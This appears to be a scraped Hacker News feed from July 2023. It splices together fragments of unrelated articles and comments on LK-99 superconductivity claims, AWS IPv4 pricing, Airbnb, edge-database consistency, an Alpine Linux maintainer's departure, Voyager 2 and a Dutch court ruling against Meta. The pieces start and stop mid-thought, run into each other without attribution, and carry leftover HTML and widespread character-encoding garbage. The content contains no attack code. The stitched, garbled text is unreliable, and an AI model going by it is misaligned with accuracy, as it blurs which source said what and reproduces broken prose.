"They come off as real amateurs," says Michael Norman, a theorist at Argonne National Laboratory. "They don't know much about superconductivity and the way they've presented some of the data is fishy." On the other hand, he says, researchers at Argonne and elsewhere are already trying to replicate the experiment. "People here are taking it seriously and trying to grow this stuff."

			(DeepL Translate excerpt from article linked)<br>
On the recent people hotly debated "if really immediately can get the Nobel Prize 'South Korea room temperature superconducting materials LK-99 paper'", July 28, Nanjing University, professor of physics Wen Haihu interviewed to the surging science and technology, said. "It's really buzzing, but it's not surprising because this thing is important." "Most of the (buzz) people are not doing superconductivity." "We carefully analysed their data, and from three aspects - resistance, magnetisation and so-called magnetic levitation - none of them are sufficient to show that it is a superconducting phenomenon (material)." "We judge that (its so-called superconductivity) is most likely an illusion."<p>

As for repeating the experiment, Wen Haihu said, "In fact, we didn't even want to do it because we judged that it didn't look like superconductivity, and then we also sent one of our classmates to work on it. Many groups internationally are repeating it. With our experience, (the data published in the current paper) is not enough to show that it is superconducting."

At the bare minimum, it's a novel substance with novel properties, so still probably Noble material.<p>

Practically, it's still superconducting even if it's only superconducting in microscopic regions. That's the kind of thing that could be used in high-end computing or precision instrumentation, provided the microscopic superconducting effect forms in a predictable, regular manner. </p><p>

Long-term, this is new ground even if it's not something immediately world-changing. Expect lots of research from everyone from governments to big universities to random garage hobbyists.</p></div>

            <description><![CDATA[<p>URL: <a href="https://www.theregister.com/2023/07/31/aws_says_ipv4_addresses_cost/">https://www.theregister.com/2023/07/31/aws_says_ipv4_addresses_cost/</a>, See on <a href="https://news.ycombinator.com/item?id=36942424">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body">
<p>Cloud giant AWS will start charging customers for public IPv4 addresses from next year, claiming it is forced to do this because of the increasing scarcity of these and to encourage the use of IPv6 instead.</p>
<p>It is now four years since we <a target="_blank" href="https://www.theregister.com/2019/11/25/ipv4_addresses_gone/">officially ran out</a> of IPv4 ranges to allocate, and since then, those wanting a new public IPv4 address have had to rely on address ranges being recovered, either from from organizations that close down or those that return addresses they no longer require as they migrate to IPv6.</p>
<p>If Amazon's cloud division is to be believed, the difficulty in obtaining public IPv4 addresses has seen the cost of acquiring a single address rise by more than 300 percent over the past five years, and as we all know, the business is <a target="_blank" href="https://www.theregister.com/2023/04/28/cloud_slowdown_hits_amazon_as/">a little short of cash at the moment</a>, so is having to pass these costs on to users.</p>

    

<p>"This change reflects our own costs and is also intended to encourage you to be a bit more frugal with your use of public IPv4 addresses and to think about accelerating your adoption of IPv6 as a modernization and conservation measure," writes AWS Chief Evangelist Jeff Barr, on the company <a target="_blank" href="https://aws.amazon.com/blogs/aws/new-aws-public-ipv4-address-charge-public-ip-insights/">news blog</a>.</p>

        


        

<p>The update will come into effect on February 1, 2024, when AWS customers will see a charge of $0.005 (half a cent) per IP address per hour for all public IPv4 addresses. These charges will apparently apply whether the address is attached to a service or not, and like many AWS charges, appear inconsequential at first glance but can mount up over time if a customer is using many of them.</p>
<p>These charges will apply to all AWS services including EC2, Relational Database Service (RDS) database instances, Elastic Kubernetes Service (EKS) nodes, and will apply across all AWS regions, the company said.</p>

        

<p>However, customers will not be charged for IP addresses that they own and bring to AWS using Amazon's BYOIP feature. AWS offers a free tier for EC2, and this will include 750 hours of public IPv4 address usage per month for the first 12 months, starting from the same date the charges do.</p>
<p>To try and help customers get a handle on how this might affect their AWS bill, the company said it is adding information on public IPv4 addresses to the AWS Cost and Usage Report (CUR). It also unveiled a new feature of Amazon VPC IP Address Management (IPAM) called <a target="_blank" href="https://docs.aws.amazon.com/vpc/latest/ipam/view-public-ip-insights.html">Public IP Insights</a>, which is intended to simplify analysis and auditing of public IPv4 addresses.</p>
<h3>10 years later</h3>
<p>It is now more than a decade since IPv6 was <a target="_blank" href="https://www.theregister.com/2012/06/05/ipv6_launch_day/">officially launched</a>, but adoption has been slow and gradual as many organizations saw little need to change at first, especially when managing a migration from the older standard to the new one was likely to be complex.</p>
<p>Although the world officially ran out of unallocated IPv4 addresses in 2019, according to the European regional Internet registry RIPE, it <a target="_blank" href="https://labs.ripe.net/author/wilhelm/ipv6-10-years-out-an-analysis-in-users-tables-and-traffic/">posted figures</a> last year showing that the IPv4 routing table still has six times as many entries as that for IPv6.</p>
<p>However, this apparent disparity may be slightly misleading, it claimed, as internet registries have taken advantage of the massive 128-bit address space of IPv6 to ensure that "organizations receive blocks that are, in many cases, large enough to cover all their future addressing needs" when allocating new address ranges, whereas IPv4 saw ever smaller allocation sizes as the address space filled up.</p>

<li><a href="https://www.theregister.com/2022/09/07/ovhcloud_ipv4/">OVHcloud opens up Bring Your Own IP service for IPv4 failover</a></li>
</ul>
<p>"Even once all networks have deployed and announced IPv6, we can expect the routing table to be smaller than that for IPv4," RIPE claimed.</p>
<p>RIPE also quoted IPv6 adoption by end users last year, as estimated by Google and APNIC, the regional internet address registry for the Asia-Pacific region, as being between 30 percent and 40 percent.</p>

        

<p>But as <em>The Register</em> wrote back when IPv4 addresses officially ran out, it is going to be with us for a good few years yet. RIPE was predicting then that it might take "five to 10 years" before the world starts to truly abandon the IPv4 address space. Four years of that have already passed, and IPv4 still seems to be going as strong as ever. Â®</p>

* The above items were never disclosed and vaguely referenced in some random fine print that was not provided before you booked and then airbnb will not issue a refund if you cancel.</p><p>Honestly, the problem with airbnb is that they are a middleman that sits between the host and you. They really won't do much to help you when you call customer service, and they won't help you in ways most hotels would help you if you called and had a problem. It's really not a great experience as soon as you need customer service from them. The hosts add all kinds of nonsense rules when you show up or after you book that are never disclosed and they do nothing about it. There is even a news article where the CEO spent a bunch of time living in airbnbs and said he experienced all this nonsense, but still nothing is done about it.</p><p>I really enjoy the authentic experiences at airbnb, but I've been burned too many times and think it's outrageous to spend thousands of dollars on high end airbnbs and pay fees for things like cleaning and then be expected to clean on my vacation or be subject to some nonsensical rule and worry my whole vacation. I'm really torn about whether it's a good service or whether it sucks but you should know what you're getting into.

We have such a bias for the new, it tends not to be a popular opinion. But so much of this technology innovation just leads us to create new versions of the same old, because the incentives are to financialize and exploit financial advantage and to reconcentrate wealth and fortune, not actually innovate.</p><p>It's perhaps not the most thought out thesis, but I wonder about it, and whenever Airbnb comes up it brings this question up for me. I mean landing rockets changes the economics of spaceâ¦ we have innovation. Itâs just that most of it just seems to be merely a greater efficiency of delivery masquerading as âdisruption.â

<div id="readability-page-1" class="page"><div id="content"><p>Application developers often deploy their apps into a single area, generally represented by a handful of AZs in a single region.
No matter where their users make requests from, those requests get served by the region where the developersâ apps run.</p><p>If a user makes a request from Europe, and the apps run in US East, that adds an extra 100-150ms of latency just by round-tripping across the Atlantic.</p><p>Edge computing tries to solve this problem, by letting app developers deploy their applications across the globe, so that apps serve the user requests closer to the user.
This removes a lot of the round-trip latency because the request has to travel less far before getting to a data center that hosts the app.</p><p>Edge computing sounds great for reducing response times for users, but <strong>the main thing stopping developers from adopting edge computing is data consistency.</strong></p><h2 id="latency-to-the-database">Latency to the database</h2><p><img src="https://zknill.io/img/latency-to-database.png#center" data-src="/img/latency-to-database.png#center" data-srcset="/img/latency-to-database.png#center, /img/latency-to-database.png#center 1.5x, /img/latency-to-database.png#center 2x" data-sizes="auto" alt="/img/latency-to-database.png#center" title="Apps generally make lots of database requests for a single user request"></p><p>Apps often make lots of requests to the database for a single request from the user.

under the premise that running closer to the users produces faster response times.</p><p>But as weâve seen, the responses times for lots of round trips to a centralised database are slower than if the app was deployed near to the database.</p><p>Logically the next step is top get a copy of your data as close to all the edge locations.</p><p><img src="https://zknill.io/img/database-near-edge.png#center" data-src="/img/database-near-edge.png#center" data-srcset="/img/database-near-edge.png#center, /img/database-near-edge.png#center 1.5x, /img/database-near-edge.png#center 2x" data-sizes="auto" alt="/img/database-near-edge.png#center" title="Edge apps with distributed databases"></p><h2 id="data-consistency">Data consistency</h2><p>Imagine a new user signs up to your app. All users need a unique username because thatâs how your app identifies them:
<strong>how do you make sure the username is unique across all the copies of your data running on the edge?</strong></p><p>We are left with the problem that: the main blocker to developers adopting edge computing is data consistency.</p><p>You need some way of checking that the username the user is registering with is unique.
The only safe way to do that is to ask/be told by the other copies of the data if that username is unique or not.
But to consult all the other copies of the data, weâd need to contact them.
To contact the other copies of the data we will encounter the same cross-region latency that we suffered from when we had the database in a single location.</p><p><img src="https://zknill.io/img/cross-region-db-latency.png#center" data-src="/img/cross-region-db-latency.png#center" data-srcset="/img/cross-region-db-latency.png#center, /img/cross-region-db-latency.png#center 1.5x, /img/cross-region-db-latency.png#center 2x" data-sizes="auto" alt="/img/cross-region-db-latency.png#center" title="Cross region database latency"></p><h2 id="two-choices">Two choices</h2><p>If we want to maintain a copy of the data close to the edge app, and by extension close to the user,
and if we want the data to be consistent,
we have to deal with the cross region latency at some point.</p><p>The two choices we have boil down to; when do we want to deal with the cross-region latency required to make the data consistent?</p><ol><li>On writes â we can choose to contact the other copies of the data when writing a record, to make sure that no other users have already registered that username.</li><li>On reads â we can choose to handle the data consistency problems on reads.</li></ol><blockquote><p>Strictly, we can choose to do both, because my usage of âconsistentâ so far in this post is quite vague, but we will come to that in a moment.</p></blockquote><p>Lets start with <strong>writes</strong>. We know that we canât have two users with the same username.</p><ul><li>Best case; the username isnât taken,</li><li>Middle case; the username is taken,</li><li>Worst case; the username is being registered <em>just</em> as we are trying to register the username.</li></ul><p>Best and middle cases are quite similar, we just need to know if the username is taken or now. The worst case is a little harder, because in this example we have two competing
requests that are racing to register the username. We need a way to decide which one will (and did) win.</p><h2 id="append-only-logs">Append-only logs</h2><p>Pretty much all databases solve the problem of two competing requests with an append-only log.
Often called a Write-ahead log or WAL.
Even if the database consists of only a single database server, the database still has to manage conflicting concurrent requests, and will still use a log.</p><p>These logs are append only - that is the database can only write to them - individual log events cannot be deleted. (Although outdated records in the log can be trimmed as a whole.)</p><p>The database has exactly one writer to the log,
and when our two competing requests try and âwriteâ (register the username),
exactly one of those requests will be first,
and the second will be rejected.</p><p><img src="https://zknill.io/img/append-only-log.png#center" data-src="/img/append-only-log.png#center" data-srcset="/img/append-only-log.png#center, /img/append-only-log.png#center 1.5x, /img/append-only-log.png#center 2x" data-sizes="auto" alt="/img/append-only-log.png#center" title="Append only log"></p><p>To guarantee that thereâs exactly one writer to the log that our âregister usernameâ write will go into, we need one database server to be responsible for that log.
This database server called the âleaderâ or âmasterâ.</p><p><img src="https://zknill.io/img/write-forwarding.png#center" data-src="/img/write-forwarding.png#center" data-srcset="/img/write-forwarding.png#center, /img/write-forwarding.png#center 1.5x, /img/write-forwarding.png#center 2x" data-sizes="auto" alt="/img/write-forwarding.png#center" title="Write forwarding"></p><p>In this diagram, the user is registering a username. The database in Australia is forwarding the write to the database in the USA. The database in the USA is the âleaderâ for the
usernameâs log, and writes the username to the log. The username is now âtakenâ, and canât be registered by anyone else.</p><p>We are dealing with the cross-region latency between Australia and USA when the write happens, to make sure that the data is consistent.
(To make sure that no two users can register the same username).</p><p>The problem is that the write is now in the USA database, but not in the Australia database.
If the user were to immediately make a request for their username, it wouldnât exist in the Australia database (yet).</p><p>This property of the system / database (or lack of) is called <strong>read-your-own-writes</strong>. And describes a system where some data is available to be read immediately after its been
written.
Not being able to read your own writes creates a weird user experience for the user,
where they are unsure if they have actually completed the task they wanted to,
because they canât immediately see the data they have just written.</p><p>To read the writes, we need replication. The log needs to be replicated back to the Australia database.</p><p><img src="https://zknill.io/img/read-own-writes.png#center" data-src="/img/read-own-writes.png#center" data-srcset="/img/read-own-writes.png#center, /img/read-own-writes.png#center 1.5x, /img/read-own-writes.png#center 2x" data-sizes="auto" alt="/img/read-own-writes.png#center" title="Read your own writes"></p><p>The Australia database should only return a successful response to the user once it has received a segment of the log that contains the write that was originally forwarded to the USA database. This ensure that the Australia database can read its own writes.</p><p>If we didnât care about the read-your-own-writes property, we could return to the user immediately and assume the replication would happen sometime later.</p><p>When touched on the <strong>âTwo choicesâ</strong> earlier, we covered writes but not reads. We saw how the database suffers from the inter-region latency when forwarding a write.</p><p>The thing about reads is; we might not care.
We might be perfectly happy that the France, etc database is slightly behind the other USA database.
We might not care that the most recent write has not been replicated to the France database yet.</p><h2 id="eventually-consistent">Eventually consistent</h2><p>If we donât care that the most recent write on the database leader (USA) has not yet been replicated to the France database, then we call this system <strong>eventually consistent</strong>.
That is, <em>eventually</em> the write will be replicated to the France database, but we donât know exactly when. And we possibly donât care (depending on the exact usage of the system).</p><p>If we <em>did</em> care, weâd call this system <strong>strongly consistent</strong> and we would require the leader to only consider the write successful once it had been fully replicated to all the
other databases.
In this case, all the databases would have all the data all the time, but writes would be much slower, as we would have to wait for all the databases to receive and reflect the
write.</p><h2 id="on-reads">On reads</h2><p>There is one final way to get <strong>strongly consistent</strong> properties of the databases, without requiring the inter-region latency hit on writes. (As we have just been discussing, the
new data is replicated across the regions when itâs written).</p><p>This is number 2, from when we covered the <em>âTwo choicesâ</em>. On reads.</p><p><img src="https://zknill.io/img/read-forwarding.png#center" data-src="/img/read-forwarding.png#center" data-srcset="/img/read-forwarding.png#center, /img/read-forwarding.png#center 1.5x, /img/read-forwarding.png#center 2x" data-sizes="auto" alt="/img/read-forwarding.png#center" title="Read forwarding"></p><p>Imagine that we hadnât required the write to be replicated to the Australia database when it was added to the log, and instead embraced an <strong>eventually consistent</strong> system.</p><p>But we had a small number of cases where we needed to make sure that the read we were performing was <strong>strongly consistent</strong>
(that is, it reads exactly the data that any database has, not just the data that this database has received yet from replication.)</p><p>To perform a one-off strongly consistent read, we could forward that read to the leader (USA), add that read to the database log, and wait for the read to be replicated back to the Australia database.
Once the Australia database receives the read in the log, it knows that it has all the most up to date data for that specific point in time, and can safely execute the read from
its local datastore.</p><p>But once again, we have to suffer the cross-region latency for the read to be forwarded to the leader database and the log to be replicated back again.</p><h2 id="what-do-we-do">What do we do?</h2><p>As I said at the start:</p><blockquote><p>The main thing stopping developers from adopting edge computing is data consistency.</p></blockquote><p>We can put the apps near the users, and a copy of the data near the apps, but in doing so we sacrifice data consistency or we suffer network latency costs.</p><p>We canât beat physics, and data can only be transmitted so fast across the network between regions. This means that we have to make choices about what kind of data consistency we
want, and importantly <strong>we have to decide: at which point do we want to deal with the latency</strong>.</p><p>Most internet apps are read-heavy, there are more reads than writes, so largely it makes sense to deal with the latency on writes.
We can do this by forwarding the writes to some leader for that piece of data (e.g. the log for usernames),
and waiting until that write is replicated back to us (so we can read our own writes).</p><h2 id="some-examples">Some examples</h2><p>The following are some examples of database systems that are optimised for read-heavy applications where we eat the latency cost on writes.</p><ul><li><a href="https://turso.tech/" target="_blank" rel="noopener noreffer">Turso</a>: writes are forwarded to the leader, reads are local.</li><li><a href="https://github.com/superfly/litefs" target="_blank" rel="noopener noreffer">Litefs</a>: writes are forwarded to the leader, reads are local.</li><li><a href="https://www.postgresql.org/docs/current/warm-standby.html#SYNCHRONOUS-REPLICATION" target="_blank" rel="noopener noreffer">Postgres warm standby in âsynchronousâ mode</a>: writes are committed to the leader and replica at the same time, reads can be from the replica.</li></ul><p>â</p><h4 id="footnote-beat-the-system">Footnote: Beat the system</h4><p>Finally itâs worth mentioning, some databases try and beat the system by structuring data in a specific way.
For example, giving the Australia database ownership over all the Australian data and user requests, and not letting region-specific datasets overlap with each other.
This can work, but it add some other difficult constraints when you want to query across datasets or join them together.</p></div></div>]]></description>

            <description><![CDATA[<p>URL: <a href="https://www.phoronix.com/news/Alpine-Linux-Prolific-Packager">https://www.phoronix.com/news/Alpine-Linux-Prolific-Packager</a>, See on <a href="https://news.ycombinator.com/item?id=36940916">Hacker News</a></p>

Alpine Linux remains one of the most popular lightweight Linux distributions built atop musl libc and Busybox. Alpine Linux has found significant use within containers and the embedded space while now sadly the most prolific maintainer of packages for the Linux distribution has decided to step down from her roles.
</p><p>
Alice "psykose" who is easily responsible for the highest number of commits per author over the past year has decided to step down from maintaining her packages.
</p><p><img src="https://www.phoronix.net/image.php?id=2023&amp;image=alpine_package_stats" alt="Alpine package stats"></p>
<p>These <a href="https://git.alpinelinux.org/aports/stats/?period=q&amp;ofs=10">Alpine aports stats</a> put her at 13,894 commits over the past year. In comparison, the second most prolific packager saw just 2,053 commits... Or put another way, psykose has 6.7x the number of commits as the next packager. The 13.8k commits is also about half of the 26.8k commits seen in total over the past year.
</p><p>
Over the weekend I was alerted to the fact that psykose/nekopsykose has begun <a href="https://github.com/alpinelinux/aports/commit/9e88698cc296a8492a8f70938c58f5755f39609d">dropping maintainership</a> of packages she maintained. All of her recent <a href="https://github.com/alpinelinux/aports/commits?author=nekopsykose">alpinelinux/aports commits</a> two days ago were removing packages she oversaw.
</p><p><img src="https://www.phoronix.net/image.php?id=alpine-linux-311&amp;image=alpine_311_2_med"></p>
<p>Curious about the situation, I reached out to Alice and she confirmed she has dropped maintenance of anything she maintained and proceeded to lock herself out of the Alpine Linux systems she had access to. She hasn't decided what to do next but likely "catch up on a year of sleep." She doesn't believe that this will ultimately impact Alpine Linux itself but hopes that others will pick-up what's needed to keep on going with the package maintenance.
</p><p>
In any event, great job to her with all of the packaging work she's done for the Alpine Linux project.</p></div></div>]]></description>

This means either we switch our prod to pypy, which won't be possible because I am very new in this team and that would be seen as a big, risky change by the others, or we keep in mind the tests do not run using the exact same runtime as production servers (which might cause bugs to go unnoticed and reach production, or failing tests that would otherwise work on a live environment).</p><p>I think if I ever started a python project right now, I'd probably try and use pypy from the start, since (at least for web development) there does not seem to be any downsides to using it.</p><p>Anyways, thank you very much for your hard work !

            <pubDate>Mon, 31 Jul 2023 10:15:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theregister.com/2023/07/31/nasa_mistakenly_disconnects_voyager_2/">https://www.theregister.com/2023/07/31/nasa_mistakenly_disconnects_voyager_2/</a>, See on <a href="https://news.ycombinator.com/item?id=36940626">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body">
<p>NASA revealed on Friday that its venerable Voyager 2 probe is currently incommunicado, because the space agency pointed its antenna in the wrong direction.</p>
<p>By the time the <a target="_blank" href="https://blogs.nasa.gov/sunspot/2023/07/28/mission-update-voyager-2-communications-pause/">news</a> was released, the antenna on the spacecraft had been pointing two degrees away from the Earth for over a week.</p>
<p>This left it without the ability to receive commands or transmit data to antennae operated by the Deep Space Network (DSN).</p>

    

<p>NASA reckons the situation is temporary and will not end the probe's nearly 46-year stint in space as it is programmed to recalibrate its position a few times a year. October 15 is the next scheduled reset.</p>

        


        

<p>The space org added that Voyager 2's trajectory is expected to remain unchanged. The probe is currently around 32 billion kilometers from Earth, and gets 15km further away every second. The glitch does not impact Voyager 1, which is currently almost 24 billion clicks away from Earth and hurtling along at 17km/sec while staying in touch with home.</p>
<p>Voyager 2's electrical systems were <a target="_blank" href="https://www.theregister.com/2023/04/27/nasa_tweaks_voyager_2s_power/">tweaked</a> earlier this year, in the hope of extending its working life.</p>
<ul>

<li><a href="https://www.theregister.com/2023/04/27/nasa_tweaks_voyager_2s_power/">NASA tweaks Voyager 2's power supply to avoid another sensor shutdown</a></li>

<li><a href="https://www.theregister.com/2022/12/05/square_kilometre_array_observatory_construction_commences/">Square Kilometre Array Observatory construction commences</a></li>

<li><a href="https://www.theregister.com/2022/08/31/voyager_1_telemetry_data_corrupted/">Voyager 1 data corrupted by onboard computer that 'stopped working years ago'</a></li>

<li><a href="https://www.theregister.com/2022/10/20/esa_integral_20/">How did ESA's gamma ray-spotting 'scope make it to 20? They totally overdid it</a></li>
</ul>
<p>If that procedure produces good results, a similar adjustment to Voyager 1 is on the cards.</p>
<p>In 2022, Voyager 1 also <a target="_blank" href="https://www.theregister.com/2022/08/31/voyager_1_telemetry_data_corrupted/">experienced</a> telemetry woes. Scientist found it sent back garbled information to Mission Control. It transpired that data was being routed incorrectly by a computer that had not worked for years.</p>

        

<p>Engineers at that time performed "telesurgery" to correct the issue, which essentially meant commanding the attitude articulation and control system (AACS) to resume sending the data to the right computer. And so the probe carried on.</p>
<p>In the past, engineers have <a target="_blank" href="https://www.theregister.com/2022/08/31/voyager_1_telemetry_data_corrupted/">compared</a> keeping the probes operational to keeping an old car running. The tech is severely outdated, yet it keeps ticking over â a trend often seen in the <a target="_blank" href="https://www.theregister.com/2022/10/20/esa_integral_20/">spacecraft of past decades</a>.</p>
<p>But while old cars can be lovingly worked on by hand in real time, the Voyagers are over 20 light hours from Earth, and communication crawls along at a tedious 160 bits per second. Â®</p>

<div id="readability-page-1" class="page"><div itemprop="text">
							
<p>In a landmark decision that signals a shift in the balance between user privacy and accountability on social media platforms, <a href="https://uitspraken.rechtspraak.nl/#!/details?id=ECLI:NL:RBDHA:2023:11254" target="_blank" rel="noreferrer noopener">the Court of The Hague has ruled</a> that Meta Platforms Ireland Ltd must provide identifying data of an anonymous Facebook user accused of making defamatory allegations.</p>



<p>The accusations surfaced in a private Facebook group focused on dating, where users share experiences about their dates, often including personal information and pictures of the individuals involved. It is common practice in these groups to post messages anonymously, thereby shielding the identity of the person making the post.</p>



<p>In this case, the anonymous user accused the plaintiff, a male Facebook user, of transgressive behaviour, a claim the plaintiff vehemently denies. He asserts that these allegations are not only false but also damaging to his reputation.</p>



<p>The plaintiff sought Meta's assistance in the matter, requesting the removal of the offensive messages and the disclosure of the anonymous user's identity. However, Meta initially responded stating that it did not find the posts defamatory and hence would not accede to his request.</p>



<p>Unsatisfied with Meta's response, the plaintiff took the matter to court. The judge acknowledged that while it couldn't be definitively established that the accusations were baseless without more concrete information, the plaintiff's right to address the allegations was paramount. The judge stated, "Without further factual information, it cannot be completely ruled out that there may be a sound factual basis. If that basis is there, it is conceivable that - however much [the claimant] is affected by this - these statements under the circumstances of the case are not unlawful and freedom of expression should therefore not be restricted."</p>



<p>In a significant ruling, the court ordered Meta to release the identifying data of the anonymous user, stating that the plaintiff's interests outweighed those of the anonymous user and Facebook. The judge ruled that the plaintiff has a real and legitimate interest in addressing the accusations and can only do so with the data held by Meta.</p>



<p>Meta argued that Facebook users should be able to express criticism, even if it is severe and anonymous. However, the judge responded that freedom of expression "is not unlimited" and that the man cannot reply within the closed Facebook groups. Furthermore, Meta's conditions permit data from users to be shared with third parties.</p>



<p>The court's ruling mandates Meta to disclose key identifying information, including the username, email address, telephone number, and the IP address used during registration and logins. Meta faces a penalty of one thousand euros per day, up to a maximum of one hundred thousand euros, if it fails to comply with the court's decision.</p>



<p>The ruling has far-reaching implications for social media platforms and highlights the ongoing challenges faced by tech companies in navigating the delicate balance between user privacy and accountability for online actions.</p>

<p>Disclaimer: Iâm not a materials scientist. I may update this over time as I collate more information<br>Updated 2023-07-31 â <a href="#sbtable">Spacebattles table</a> (11 online replication efforts)</p>



<p>On 22 July 2023, two mysterious papers were suddenly published in arxiv.org â this is a website of scientific papers that is often the first step to peer-reviewed publication, but itâs not a total confirmation. They were published about two hours apart â the first one, with three authors credited, claims to have created <strong>the worldâs first room-temperature-and-pressure (RTP) superconductor. </strong></p>



<p><a href="https://arxiv.org/abs/2307.12008">This first paper is short and appears to be hastily written</a>, and has three authors attached: <a href="https://arxiv.org/search/cond-mat?searchtype=author&amp;query=Lee%2C+S">Sukbae Lee</a>,&nbsp;<a href="https://arxiv.org/search/cond-mat?searchtype=author&amp;query=Kim%2C+J">Ji-Hoon Kim</a>,&nbsp;<a href="https://arxiv.org/search/cond-mat?searchtype=author&amp;query=Kwon%2C+Y">Young-Wan Kwon</a>.</p>



<p><a href="https://arxiv.org/abs/2307.12037">The second paper is much more detailed</a>, though there are some signs it that was still pushed out a bit quickly. However, even more curiously, it has six authors: <a href="https://arxiv.org/search/cond-mat?searchtype=author&amp;query=Lee%2C+S">Sukbae Lee</a>,&nbsp;<a href="https://arxiv.org/search/cond-mat?searchtype=author&amp;query=Kim%2C+J">Jihoon Kim</a>,&nbsp;<a href="https://arxiv.org/search/cond-mat?searchtype=author&amp;query=Kim%2C+H">Hyun-Tak Kim</a>,&nbsp;<a href="https://arxiv.org/search/cond-mat?searchtype=author&amp;query=Im%2C+S">Sungyeon Im</a>,&nbsp;<a href="https://arxiv.org/search/cond-mat?searchtype=author&amp;query=An%2C+S">SooMin An</a>,&nbsp;and <a href="https://arxiv.org/search/cond-mat?searchtype=author&amp;query=Auh%2C+K+H">Keun Ho Auh</a>. The third author of the first paper is removed from the second.</p>



<p><strong>The purported properties of the material labeled âLK-99â are incredible.</strong> Originally synthesised in 1999, not only is it RTP, but the critical temperature is actually 127Â°C â above the boiling temperature of water. The synthesis method is also shockingly simple: Finely grind and mix Lanarkite (Pb<sub>2</sub>(SO<sub>4</sub>)O) and Copper Phosphide (Cu<sub>3</sub>P) and bake it at 925Â°C in a vacuum chamber for a day. The ability to discover and synthesise it has theoretically been available since the industrial revolution. Now, one should be able to do it in a garage or home lab.</p>



<p>The reaction online is a rapid mix of skepticism and curiosity. Fraudulent claims have occurred before â the previous one claimed it required 10,000 atm, as a deliberate delay to independent verification. That doesnât exist here. The authorship is also curious: The main authors are experts in superconductivity and magnetic research. It is widely noted that only a maximum of three people can recieve a Nobel Prize. Was the first paper a deliberate attempt to flag themselves as the finders?</p>



<p>Young-Wan Kwon, the removed author from the first paper, <a href="https://twitter.com/sanxiyn/status/1684970570109345792">crashes a science conference</a> several days later and talks about the discovery. He couldnât demonstrate a sample, and was apparently expelled from the science group months ago. Is this a sign of treachery? In-fighting for credit? It makes the whole thing pass the sniff test. Many of us may not believe it yet, but <strong>they</strong> certainly do. What else could make an expert behave like that?</p>



<p>As I begin writing this post on 30 July, the live reaction â and attempts to replicate it â has been developing day-by-day on the scientific community on Twitter. A space engineering startup in the Los Angeles area <a href="https://twitter.com/andrewmccalip/status/1684821396411809792">coincidentally has all the tools on-hand and available</a>, and quickly orders the materials and blogs about the day-by-day progress of synthesis. <a href="https://twitter.com/sanxiyn/status/1685095248811413504">A Korean user fluent in English</a> begins translating news from Korean newspapers and internet forums. <a href="https://twitter.com/elsa17z/status/1685122285705859072?s=20">A Chinese user does the same</a> for Chinese social media. Scientists who maintain an online presence begin <a href="https://twitter.com/Liv_Boeree/status/1685416132612632576?s=20">explaining the implications</a> and dissect the paper. <a href="https://twitter.com/altryne/status/1685148163223719936?s=20">Someone begins compiling key figures acting as information sources across language barriers.</a></p>



<p>The magic of room-temperature superconductors is something that shows up in sci-fi, and is easily understood at the high-school physics level. But having most of these ongoing news break on Twitterâ¦ well, Iâm not a heavy user of Twitter, but I never quite figured out a good way to track an event after it has occured. Itâs very good for a live feed, but it gets rather scattered if youâre trying to catch up. This post is just my way of making sense of the key opening events.</p>



<p>Is it nothing? Is it less than expected? At the very least, thereâs a lot of buzz right now. At the very least, I might stick additional events in chronological order below the next couple of separator lines.</p>



<hr>



<h6>Whatâs the Big Deal?</h6>



<p>If you need a quick high-school physics primer, hereâs the deal:</p>



<p>A superconductor is an electrical conductor with zero resistance. It was first discovered when it was found that resistance drops with temperature, and for some reason, instead of dropping in a curve, some materials immediately drop to zero resistance when they pass a certain point, called the âcritical temperatureâ. Zero resistance means that no heat is generated when electricity passes through; in other words, the wire is 100% efficient and energy is not lost over distance, and thereâs no heat generation at super-high voltages. The caveat is that the temperature for most of these needs to be way below -200Â°C. You still need to spend a lot of energy keeping it cool, but the heat doesnât come from the electricity.</p>



<p>The general result is that any device using superconducting material â such as MRI machines â are bulky and immobile, due to the constant need for cryogenics. A room-temperature superconductor allows for things like an infinitely long power cable without loss, or a portable MRI scanner.</p>



<h6>A Rough History of Original Synthesis to the Paper</h6>



<p>Based on the investigation by <a href="https://twitter.com/8teAPi/status/1684385895565365248">this user</a>, Sukbae Lee and Jihoon Kim originally found the material in 1999 â thus the label âLK-99â. They were in graduate school at the time, and their mentor was also an expert in this area, theorising that there were signs of superconductivity in this, but required more research. They seem to shelve the whole thing due to the nature of graduate school.</p>



<p>Fast-forwarding to 2017, Lee &amp; Kim have scientific careers, and are called back by their mentor, who encourages them to complete the research. However, without any backing â particularly on the English-speaking international level â they work with Young-Wan Kwon and somehow acquire funding.</p>



<p>By 2022 and early 2023, patents are filed. Something happens with Kwon, and he appears to publish the first paper without warning.</p>



<h6>The Third Paper</h6>



<p>In one of the citations for the detailed paper, one of the citations is <a href="http://journal.kci.go.kr/jkcgct/archive/articleView?artiId=ART002955269">one of their own papers</a> published several months prior about the theoretical causes of superconductivity in LK-99. The paper is written in Korean, though there is an abstract in English: The general idea is that a one-dimensional electron structure could explain the high temperature superconductivity of the material, which has a critical temperature of at least over 97Â°C. </p>



<p>(Iâm not a materials scientist so donât expect a good explanation.)</p>

<h2 id="what-is-matrix">What is Matrix?</h2>
<p><a href="https://matrix.org/">Matrix</a> is an open network for secure and decentralized
communication. Users from every Matrix homeserver can chat with users from all
other Matrix servers. You can even use bridges to communicate with users outside
of Matrix, like a community on Discord.</p>
<h2 id="why-conduit">Why Conduit?</h2>
<p>Conduit is a lightweight open-source server implementation of the <a href="https://matrix.org/docs/spec">Matrix
Specification</a> with a focus on easy setup and low
system requirements. That means you can make your own Conduit setup in just
a few minutes.</p>
<p>Conduit keeps things simple, it's a single binary with an embedded database and
can be much faster than other server implementations in some cases.</p>

<h2>&gt;&gt;&gt; 2023-07-29 Free Public WiFi</h2>

<p>Remember Free Public WiFi?</p>
<p>Once, many years ago, I stayed on the 62nd floor of the Westin Peachtree Plaza
in Atlanta, Georgia. This was in the age when the price of a hotel room was
directly correlated with the price of the WiFi service, and as a high school
student I was not prepared to pay in excess of $15 a day for the internet. As I
remember, a Motel 6 that was not blocks away but within line of sight ended up
filling the role. But even up there, 62 floors from the ground, there was false
promise: Free Public WiFi.</p>
<p>I am not the first person to write on this phenomenon, I think I originally
came to understand it as a result of a 2010 segment of <em>All Things Considered</em>.
For a period of a few years, almost everywhere you went, there was a WiFi
network called "Free Public WiFi." While it was both free and public in the
most literal sense, it did not offer internet access. It was totally useless,
and fell somewhere between a joke, a scam, and an accident of history. Since
I'm not the first to write about it, I have to be the most thorough, and so
